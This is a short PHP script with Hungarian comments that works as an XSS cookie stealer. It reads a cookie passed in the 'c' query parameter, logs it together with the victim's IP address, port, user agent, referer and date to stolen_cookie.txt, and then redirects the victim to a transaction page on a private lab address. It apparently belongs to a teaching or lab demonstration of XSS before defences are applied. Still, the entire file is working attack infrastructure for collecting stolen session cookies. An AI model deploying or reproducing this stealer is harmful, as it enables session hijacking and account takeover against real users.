<?php
	session_start();
	
	header("location: http://192.168.0.105:8080/xss_user/vedekezes_elott/transaction.php");
	
	//A kód struktúrájának forrása: https://hackingandsecurity.blogspot.com/2017/09/nice-to-havephp-cookie-stealer.html
	function logData(){
		$ipLog="stolen_cookie.txt";
		$cookie = $_GET['c'];		
		
		//Az IP azonosítására alkalmas kód forrása: https://www.w3resource.com/php-exercises/php-basic-exercise-5.php
		//Ha az IP interneten megosztott
		if (!empty($_SERVER['HTTP_CLIENT_IP']))   
			{
				$ip_address = $_SERVER['HTTP_CLIENT_IP'];
			}
			//Ha az IP a proxy-n van
			elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))  
				{
					$ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
				}
				//Ha az IP remote címen található
				else
					{
						$ip_address = $_SERVER['REMOTE_ADDR'];
					}
					
		$rem_port = $_SERVER['REMOTE_PORT'];
		$user_agent = $_SERVER['HTTP_USER_AGENT'];
		$referer = $_SERVER['HTTP_REFERER'];
		$date=date ("l dS of F Y h:i:s A");
		
		$log=fopen("$ipLog", "a+");
		if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog)) {
			fputs($log, "IP: $ip_address | PORT: $rem_port | Agent: $user_agent | REF: $referer | DATE{ : } $date | COOKIE:  $cookie <br>");
		} else {
			fputs($log, "IP: $ip_address | PORT: $rem_port |  Agent: $user_agent | REF: $referer |  DATE: $date | COOKIE:  $cookie \n\n");
			fclose($log);
		}
	}
	
	logData();
?>